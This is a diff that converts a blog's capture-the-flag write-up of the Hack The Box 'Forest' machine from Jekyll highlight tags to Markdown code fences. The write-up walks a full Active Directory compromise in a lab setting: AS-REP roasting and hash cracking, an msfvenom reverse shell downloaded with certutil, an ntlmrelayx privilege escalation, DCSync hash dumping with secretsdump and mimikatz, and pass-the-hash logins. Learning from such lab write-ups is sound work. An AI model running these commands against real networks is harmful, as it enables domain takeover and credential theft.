@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Forest"
-date:   2020-03-22 08:38:00 +0800
-categories: hackthebox
-tags: ldap kerberos windows
+title: Hack The Box - Forest
+date: 2020-03-22 08:38:00 +0800
+categories: [hackthebox]
+tags: [ldap, kerberos, windows]
 ---
 This box was incredibly difficult for me because I had little to no experience in pentesting with Active Directory environments but it was definitely an eye-opening experience!
 
@@ -15,14 +14,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.161 forest.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC forest.htb
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-19 08:19 EDT
 Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
@@ -79,7 +78,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 285.63 seconds
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -87,25 +86,25 @@ Seems like an Active Directory Domain Controller. Where do we start ? @.@
 
 According to the `nmap`'s host script results, we see the actual domain name of the box is `htb.local` so lets modify `/etc/hosts` to include it as well.
 
-{% highlight bash %}
+```bash
 $ cat /etc/hosts
 ...
 10.10.10.161 forest.htb htb.local
-{% endhighlight %}
+```
 
 Seeing that there might be a `DNS` server running on port 53, lets try to use `dig` on it.
 
-{% highlight bash %}
+```bash
 $ dig axfr htb.local @10.10.10.161
 
 ; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr htb.local @10.10.10.161
 ;; global options: +cmd
 ; Transfer failed.
-{% endhighlight %}
+```
 
 Nothing :( `LDAP` is running on port `389` so lets check that out using `ldapsearch`.
 
-{% highlight bash %}
+```bash
 $ ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local" 
 # extended LDIF
 #
@@ -122,11 +121,11 @@ objectClass: domain
 objectClass: domainDNS
 distinguishedName: DC=htb,DC=local
 ...
-{% endhighlight %}
+```
 
 I'm not sure what to look for but let's first look at what users we can find? I wasn't familiar with how `LDAP` queries work so I decided to use another tool [`windapsearch`](https://github.com/ropnop/windapsearch) to simplify the job.
 
-{% highlight bash %}
+```bash
 python windapsearch.py -d htb.local -U
 [+] No username provided. Will try anonymous bind.
 [+] No DC IP provided. Will try to discover via DNS lookup.
@@ -159,13 +158,13 @@ userPrincipalName: santi@htb.local
 
 
 [*] Bye!
-{% endhighlight %}
+```
 
 Nice! We found 5 usernames to play with! But what exactly can we do with them?
 
 Seeing that there is `Kerberos` running on port `88`, we know that we probably need to get our hands dirty with Kerberos attacks. After reading this [article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/), lets see if we can perform the `ASREPRoast` attack using `impacket`'s [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) while specifying the 5 usernames we found.
 
-{% highlight bash %}
+```bash
 $ cat users.txt
 sebastien
 lucinda
@@ -181,7 +180,7 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
-{% endhighlight %}
+```
 
 Looks like we didn't manage to get any hashes... 
 
@@ -189,7 +188,7 @@ At this point, I wasn't sure how to carry on so I check the forums for hints. Ma
 
 Inside of `impacket`'s collection of scripts, there was a file called [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py) which seemed hopeful.
 
-{% highlight bash %}
+```bash
 $ GetADUsers.py -all htb.local/
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
@@ -208,13 +207,13 @@ svc-alfresco                                          2019-11-16 07:54:12.200875
 andy                                                  2019-09-22 18:44:16.291082  <never>             
 mark                                                  2019-09-20 18:57:30.243568  <never>             
 santi                                                 2019-09-20 19:02:55.134828  <never> 
-{% endhighlight %}
+```
 
 There it is! The 6th username is `svc-alfresco`. But I wonder why did the username not appear in our `LDAP` search results just now?
 
 After appending the username to the list of usernames, we performed the `ASREPRoast` attack again.
 
-{% highlight bash %}
+```bash
 $ GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
@@ -226,10 +225,10 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
 $ cat hashes.asreproast
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:2bb5707401079b05d2add14953eb4d3c$e18b26c973eff18a7251f9f91af611d656b3534a66acd206f4354192c9c190583dc0444ec333ced4859abdd727fefe34277023f77ce6074bae70b015f6fb94d0abdd9f6c900c15d55f59919c7261e62c10f29f8e63cca4906f4df075a12e10398d094f1ca165a3b23a419501c363b77b607bdcf740931c0bb21866b2feed344d4195a1a164d7c27154e7a00131f9f7a6e8a7ac4845df6fe7b27656a6423126a3933503d7d507f68b787d21e1b80d1fefb09f0dfd237b8ff3e499613f5fd0e0baa2c000c1fcf069fc4d1d5bcedf98d8fb6d8eebf70d6233e10e40944ce5849c7bb94319d68229
-{% endhighlight %}
+```
 
 Great! We are back on track! We then cracked the hash using `john`.
-{% highlight bash %}
+```bash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
 Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
@@ -239,10 +238,10 @@ s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
 1g 0:00:00:06 DONE (2019-10-26 03:10) 0.1457g/s 595591p/s 595591c/s 595591C/s s401447401447401447..s3r2s1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-{% endhighlight %}
+```
 
 With `svc-alfresco:s3rvice`, I tried enumerating for `SMB` shares using `smbmap` but found nothing :(
-{% highlight bash %}
+```bash
 smbmap -H htb.local -u svc-alfresco -p s3rvice
 [+] Finding open SMB ports....
 [+] User SMB session establishd on htb.local...
@@ -254,11 +253,11 @@ smbmap -H htb.local -u svc-alfresco -p s3rvice
 	IPC$                                              	READ ONLY
 	NETLOGON                                          	READ ONLY
 	SYSVOL                                            	READ ONLY
-{% endhighlight %}
+```
 
 With no other service to try out the credentials, I re-scanned for open ports, but this time from ports 1-65535.
 
-{% highlight bash %}
+```bash
 $ nmap -sS -p 1-65535 htb.local
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-16 08:40 EST
 Nmap scan report for htb.local (10.10.10.161)
@@ -289,11 +288,11 @@ PORT      STATE SERVICE
 49684/tcp open  unknown
 49698/tcp open  unknown
 49708/tcp open  unknown
-{% endhighlight%}
+```
 
 I now see a possible entry point, which is port `5985` that is used by the `WinRM` service for remote management of Windows systems. Lets see if we can establish a shell using `Alamot`'s [`winrm_shell.rb`](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)
 
-{% highlight ruby %}
+```ruby
 require 'winrm'
 
 # Author: Alamot
@@ -306,22 +305,22 @@ conn = WinRM::Connection.new(
   :no_ssl_peer_verification => true
 )
 ...
-{% endhighlight %}
+```
 
 # user.txt
 
-{% highlight bash %}
+```bash
 $ ruby winrm_shell.rb
 PS htb\svc-alfresco@FOREST Documents> whoami
 htb\svc-alfresco
-{% endhighlight %}
+```
 
 We finally got in! Now, to grab the user flag.
-{% highlight powershell %}
+```powershell
 PS htb\svc-alfresco@FOREST Documents> cd ../Desktop
 PS htb\svc-alfresco@FOREST Desktop> more user.txt
 e5e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration (2)
 
@@ -329,16 +328,16 @@ This was where I really got lost and I had to turn to the forums for more hints.
 
 Many mentioned about some "dog" but I guess they were referring to [`BloodHound`](https://github.com/BloodHoundAD/BloodHound). 
 
-{% highlight raw%}
+```
 BloodHound is a single page Javascript web application, built on top of Linkurious, compiled with Electron, with a Neo4j database fed by a PowerShell/C# ingestor.
 
 BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and eliminate those same attack paths. Both blue and red teams can use BloodHound to easily gain a deeper understanding of privilege relationships in an Active Directory environment.
-{% endhighlight %}
+```
 
 When I first read the description, I was pretty amazed as I had yet to see any applications of graph theory in cyber security and I did a bit of graph theory in my data structures and algorithms class. To get the PowerShell ingestor ([`SharpHound`](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe)) to run on the system, I first need to upgrade my current `WinRM` shell to a `meterpreter` shell.
 
 First, I generate my reverse shell executable using `msfvenom` and start our reverse shell listener.
-{% highlight bash %}
+```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f exe > shell.exe
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -358,19 +357,19 @@ LPORT => 1337
 msf5 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.XX.XX:1337
-{% endhighlight %}
+```
 
 And then start a web server using the builtin `SimpleHTTPServer` module in `python`
-{% highlight bash %}
+```bash
 $ mkdir httpserver
 $ cd httpserver
 $ cp ~/shell.exe .
 $ python -m SimpleHTTPServer 80
 Serving HTTP on 0.0.0.0 port 80 ...
-{% endhighlight %}
+```
 
 In our previous `WinRM` shell still hopefully connected,
-{% highlight raw %}
+```
 PS htb\svc-alfresco@FOREST Documents> certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
 ****  Online  ****
   000000  ...
@@ -378,17 +377,17 @@ PS htb\svc-alfresco@FOREST Documents> certutil -f -split -urlcache http://10.10.
 CertUtil: -URLCache command completed successfully.
 
 PS htb\svc-alfresco@FOREST Documents>./shell.exe
-{% endhighlight %}
+```
 
-{% highlight raw %}
+```
 [*] Sending stage (179779 bytes) to 10.10.10.161
 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -> 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500
 
 meterpreter >
-{% endhighlight %}
+```
 
 Next up, we upload `SharpHound.ps1` to the box and run it.
-{% highlight raw %}
+```
 meterpreter > upload SharpHound.ps1 .
 [*] uploading  : SharpHound.ps1 -> .
 [*] uploaded   : SharpHound.ps1 -> .\SharpHound.ps1
@@ -415,34 +414,34 @@ Finished enumeration for htb.local in 00:00:03.7645465
 Compressing data to C:\Users\svc-alfresco\Documents\20191116084214_BloodHound.zip.
 You can upload this file directly to the UI.
 Finished compressing files!
-{% endhighlight %}
+```
 
 And now to retrieve the compressed file back to our system.
-{% highlight raw %}
+```
 PS C:\Users\svc-alfresco\Documents> exit
 C:\Users\svc-alfresco\Documents> exit
 meterpreter > download 20191116084214_BloodHound.zip
 [*] downloading  : 20191116084214_BloodHound.zip. -> /root/Desktop
 [*] downloaded   : 20191116084214_BloodHound.zip. -> /root/Desktop/20191116084214_BloodHound.zip
-{% endhighlight %}
+```
 
 And now the moment you have been waiting for, witness the capabilities of `BloodHound`! 
 There are actually 2 ways to run `BloodHound`, first being running it on your own system and secondly being running it in a `Docker` container. Since it is extremely troublesome to set up, I will be using this image [`belane/bloodhound`](https://github.com/belane/docker-bloodhound).
 
-{% highlight bash %}
+```bash
 $ docker run -it \
 -p 7474:7474 \
 -e DISPLAY=unix$DISPLAY \
 -v /tmp/.X11-unix:/tmp/.X11-unix \
 --device=/dev/dri:/dev/dri \
 --name bloodhound belane/bloodhound
-{% endhighlight %}
+```
 
 What you will notice is that a window will automatically be opened and `BloodHound` is instantly ready to be used. Currently, it is not displaying anything as we had yet to upload our data yet. `BloodHound` actually supports drag and drop but for some reason it was not working so we need to use `docker cp` to get the data in.
 
-{% highlight bash %}
+```bash
 $ docker cp 20191116084214_BloodHound.zip bloodhound:/20191116084214_BloodHound.zip
-{% endhighlight %}
+```
 
 Then from the interface, click on `Upload Data` on the right side, select the file and hit `Open`. It will take a while for `BloodHound` to populate its database.
 
@@ -454,9 +453,9 @@ I won't go through all the features of `BloodHound`, but I will be focusing on o
 
 As you can see, there is indeed a path for us to escalate our privileges. The main focus will be on the edge between `EXCHANGE WINDOWS PERMISSION@HTB.LOCAL` and HTB.LOCAL. If you right-click on the edge and click on Help, more information of the `WriteDacl` privilege will be given.
 
-{% highlight raw %}
+```
 The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
-{% endhighlight %}
+```
 
 According to this [post](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/), the `WriteDacl` privilege allows us to perform `DCSync` operations, which somehow allows us to retrieve hashed passwords from the Active Directory. Hence, we will need to add a user to the `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL`.
 
@@ -464,28 +463,28 @@ According to this [post](https://dirkjanm.io/abusing-exchange-one-api-call-away-
 
 First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which is a module that I use that contains many useful `Powershell` commands for offensive operations.
 
-{% highlight raw %}
+```
 meterpreter > upload /root/Downloads/PowerView.ps1 .
 [*] uploading  : /root/Downloads/PowerView.ps1 -> .
 [*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
-{% endhighlight %}
+```
 
 Back to the powershell shell, we will import it in.
-{% highlight powershell %}
+```powershell
 Import-Module .\PowerView.ps1
-{% endhighlight %}
+```
 
 Next we will create a new user and add him to the `EXCHANGE WINDOWS PERMISSIONS` group.
-{% highlight powershell %}
+```powershell
 $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
 Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
-{% endhighlight %}
+```
 
 ![](/assets/images/forest3.png)
 
 According to this picture from the earlier post, we will need to run `ntlmrelayx` on our machine.
-{% highlight bash %}
+```bash
 $ ntlmrelayx.py -t ldap://htb.local --escalate-user rizemon
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
@@ -503,7 +502,7 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [*] Setting up HTTP Server
 
 [*] Servers started, waiting for connections
-{% endhighlight %}
+```
 
 With that done, we need to get the `Exchange` Server to perform `NTLM` authentication to us over `HTTP`. However, there is no `Exchange` server running on the box! Since we already have a user in the `EXCHANGE WINDOWS PERMISSIONS` group, we can simply use our own browser to do the authentication.
 
@@ -511,7 +510,7 @@ Opening any browser, we browse to `http://localhost/privexchange`. We will then 
 
 Back on our `ntlmrelayx`, we see that our new user has gotten the necessary privileges to perform `DCSync` operations!
 
-{% highlight bash %}
+```bash
 *] HTTPD: Received connection from 127.0.0.1, attacking target ldap://htb.local
 [*] HTTPD: Client requested path: /privexchange
 [*] HTTPD: Client requested path: /privexchange
@@ -523,11 +522,11 @@ Back on our `ntlmrelayx`, we see that our new user has gotten the necessary priv
 [*] Success! User rizemon now has Replication-Get-Changes-All privileges on the domain
 [*] Try using DCSync with secretsdump.py and this user :)
 [*] Saved restore state to aclpwn-20191229-070933.restore
-{% endhighlight %}
+```
 
 And now the last step is to obtain the hash for the domain administrator account using `impacket`'s [`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py).
 
-{% highlight bash %}
+```bash
 $ python secretsdump.py 'htb.local/rizemon:Password123!@htb.local' -just-dc
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
@@ -535,13 +534,13 @@ Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
 ...
-{% endhighlight %}
+```
 
 # root.txt (1)
 
 Using `impacket`'s [`psexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) and the hashes we got, we can remotely login to the box as Administrator.
 
-{% highlight bash %}
+```bash
 $ psexec.py Administrator@htb.local -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
@@ -557,38 +556,38 @@ Microsoft Windows [Version 10.0.14393]
 
 C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
 f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # root.txt(2)
 
 First we will need to upload [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), which contains the commands needed for our exploit. 
 
-{% highlight raw %}
+```
 meterpreter > upload /root/Downloads/PowerView.ps1 .
 [*] uploading  : /root/Downloads/PowerView.ps1 -> .
 [*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
-{% endhighlight %}
+```
 
 Back to the powershell shell, we will import it in.
-{% highlight powershell %}
+```powershell
 Import-Module .\PowerView.ps1
-{% endhighlight %}
+```
 
 Next we will create a new user and add him to the `EXCHANGE WINDOWS PERMISSIONS` group.
-{% highlight powershell %}
+```powershell
 $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 New-DomainUser -SamAccountName rizemon -AccountPassword $UserPassword
 Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members 'rizemon'
-{% endhighlight %}
+```
 
 With that done, we will need to login as the newly created user. To do so, we will need to allow the user to be remotely managed by adding him to the `Remote Management Users` group.
-{% highlight powershell %}
+```powershell
 Add-DomainGroupMember -Identity "Remote Management Users" -Members 'rizemon'
-{% endhighlight %}
+```
 
 We then establish a shell using `Alamot`'s [`winrm_shell.rb`](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) and upgrade to a `meterpreter` shell.
 
-{% highlight ruby %}
+```ruby
 require 'winrm'
 
 # Author: Alamot
@@ -601,9 +600,9 @@ conn = WinRM::Connection.new(
   :no_ssl_peer_verification => true
 )
 ...
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 $ ruby winrm_shell.rb
 PS htb\rizemon@FOREST Documents> certutil -f -split -urlcache http://10.10.XX.XX/shell.exe
 ****  Online  ****
@@ -612,29 +611,29 @@ PS htb\rizemon@FOREST Documents> certutil -f -split -urlcache http://10.10.XX.XX
 CertUtil: -URLCache command completed successfully.
 
 PS htb\rizemon@FOREST Documents>./shell.exe
-{% endhighlight %}
+```
 
-{% highlight raw %}
+```
 [*] Sending stage (179779 bytes) to 10.10.10.161
 [*] Meterpreter session 1 opened (10.10.XX.XX:1337 -> 10.10.10.161:50337) at 2019-11-16 11:22:12 -0500
 
 meterpreter >
-{% endhighlight %}
+```
 
 We are going to need [`PowerView`](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) again as well as [`mimikatz`](https://github.com/gentilkiwi/mimikatz/releases), which is used to dump out the password hashes.
 
-{% highlight raw %}
+```
 meterpreter > upload /root/Downloads/PowerView.ps1 .
 [*] uploading  : /root/Downloads/PowerView.ps1 -> .
 [*] uploaded   : /root/Downloads/PowerView.ps1 -> .\PowerView.ps1
 meterpreter > upload /root/Downloads/mimikatz.exe .
 [*] uploading  : /root/Downloads/mimikatz.exe -> .
 [*] uploaded   : /root/Downloads/mimikatz.exe -> .\mimikatz.exe
-{% endhighlight %}
+```
 
 To dump out the hashes, the new user will need the `DCSync` privileges, which consist of the `DS-Replication-Get-Changes`,  `DS-Replication-Get-Changes-All` and `Replicating Directory Changes In Filtered Set` rights. More can be learnt from [here](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync). Fortunately, we can use the `Add-DomainObjectAcl` function to add all 3 privilges for us using the `-Rights DCSync` option.
 
-{% highlight powershell %}
+```powershell
 meterpreter > shell
 Process 1224 created.
 Channel 2 created.
@@ -650,10 +649,10 @@ PS C:\Users\peter1\Documents>Import-Module ./PowerView.ps1
 Import-Module ./PowerView.ps1
 PS C:\Users\peter1\Documents> Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync
 Add-ObjectACL -PrincipalIdentity rizemon -Rights DCSync
-{% endhighlight %}
+```
 
 And finally, we dump out the hashes.
-{% highlight raw %}
+```
 PS C:\Users\rizemon\Documents> ./mimikatz.exe
 ./mimikatz.exe
 
@@ -684,11 +683,11 @@ Object Relative ID   : 500
 
 Credentials:
   Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6
-{% endhighlight %}
+```
 
 Using `impacket`'s [`psexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) and the hash we got, we can remotely login to the box as Administrator.
 
-{% highlight bash %}
+```bash
 $ psexec.py Administrator@htb.local -hashes :32693b11e6aa90eb43d32c72a07ceea6
 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
@@ -704,6 +703,6 @@ Microsoft Windows [Version 10.0.14393]
 
 C:\Windows\system32>more C:\Users\Administrator\Desktop\root.txt
 f048XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
